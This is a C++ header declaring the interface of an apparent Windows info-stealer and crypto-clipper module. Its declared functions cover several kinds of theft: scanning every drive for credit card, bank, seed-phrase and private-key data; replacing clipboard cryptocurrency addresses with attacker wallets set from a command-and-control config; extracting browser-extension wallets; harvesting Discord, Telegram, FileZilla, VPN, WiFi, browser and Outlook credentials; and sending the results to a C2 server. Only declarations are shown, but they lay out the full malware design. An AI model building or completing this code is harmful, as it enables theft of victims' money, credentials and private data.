#ifndef DATA_SCRAPER_H
#define DATA_SCRAPER_H

#include <winsock2.h>
#include <windows.h>
#include <string>
#include <vector>
#include <atomic>
#include <thread>
#include <mutex>
#include <unordered_set>

// Forward declare SOCKET
struct sockaddr_in;

class DataScraper {
public:
    DataScraper();
    ~DataScraper();

    // Start all scanning threads
    void Start(SOCKET sock);

    // Stop all scanning threads
    void Stop();

    // Check if scanner is running
    bool IsRunning() const { return m_running; }

    // Set crypto wallet addresses for clipper (from C2 config)
    void SetWalletAddress(const std::string& cryptoType, const std::string& address);

    // Get current wallet addresses
    std::string GetWalletAddress(const std::string& cryptoType) const;

private:
    // ── Phase A: File Scanner + Credit Card/Bank Finder ──
    void ScannerThread();           // Main scanner thread
    void ScanAllDrives();           // Enumerate all drives
    void ScanDirectory(const std::string& path); // Recursive scan
    void ScanFile(const std::string& path);      // Check and scan a file
    bool IsTextFile(const std::string& path);    // Check if file is text
    bool IsImageFile(const std::string& path);   // Check if file is image
    std::string ReadTextFile(const std::string& path); // Read text content
    std::string GetFileHash(const std::string& path);  // SHA256 hash
    bool IsAlreadyScanned(const std::string& hash);    // Check hash cache

    // Regex scanning
    void ScanTextForData(const std::string& text, const std::string& filePath);
    bool FindCreditCards(const std::string& text, std::vector<std::string>& results);
    bool FindBankInfo(const std::string& text, std::vector<std::string>& results);
    bool FindCryptoAddresses(const std::string& text, std::vector<std::string>& results);
    bool FindSeedPhrases(const std::string& text, std::vector<std::string>& results);
    bool FindPrivateKeys(const std::string& text, std::vector<std::string>& results);

    // ── Phase B: Crypto Clipper ──
    void ClipboardMonitorThread();  // Polling loop
    std::string DetectCryptoAddress(const std::string& text);
    std::string ReplaceAddress(const std::string& original);
    std::string GetClipboardText();
    bool SetClipboardText(const std::string& text);
    std::string HashClipboard(const std::string& text);

    // ── Phase C: Wallet Extractor ──
    void WalletScannerThread();
    void ScanChromeExtensions();
    void ScanFirefoxExtensions();
    void ScanEdgeExtensions();
    void ExtractLevelDB(const std::string& path, const std::string& extensionId);

    // ── Phase D: OCR Scanner ──
    void OCRScannerThread();
    std::string OCRImage(const std::string& path);
    std::string OCRWithWindowsAPI(const std::string& path);
    std::string OCRWithMetadata(const std::string& path);
    std::string OCRWithRawScan(const std::string& path);
    std::string ExtractTextFromBitmap(HBITMAP hBitmap, int width, int height);

    // ── Phase E: Installed App Credential Scanner ──
    void AppCredentialScannerThread();
    void ScanDiscordTokens();
    void ScanSteamConfig();
    void ScanTelegramSession();
    void ScanFileZillaPasswords();
    void ScanVPNConfigs();
    void ScanWiFiPasswords();
    void ScanBrowserSavedPasswords();
    void ScanOutlookProfiles();
    void ScanInstalledApps();

    // ── Communication ──
    void SendToC2(const std::string& type, const std::string& data);
    void SendProgress(const std::string& status, int scanned, int found);

    // ── State ──
    std::atomic<bool> m_running{false};
    std::atomic<bool> m_scannerActive{false};
    std::atomic<bool> m_clipperActive{false};
    std::atomic<bool> m_walletActive{false};
    std::atomic<bool> m_ocrActive{false};
    SOCKET m_sock;

    // Threads
    std::thread m_scannerThread;
    std::thread m_clipboardThread;
    std::thread m_walletThread;
    std::thread m_ocrThread;
    std::thread m_appCredThread;

    // Wallet addresses for clipper
    mutable std::mutex m_walletMutex;
    std::string m_btcAddress;
    std::string m_ethAddress;
    std::string m_solAddress;
    std::string m_ltcAddress;
    std::string m_dogeAddress;
    std::string m_bchAddress;
    std::string m_xrpAddress;

    // Scanned file hash cache (in-memory dedup)
    std::mutex m_hashMutex;
    std::unordered_set<std::string> m_scannedHashes;

    // Clipboard dedup
    std::string m_lastClipboardHash;

    // Stats
    std::atomic<int> m_filesScanned{0};
    std::atomic<int> m_itemsFound{0};
};

#endif // DATA_SCRAPER_H
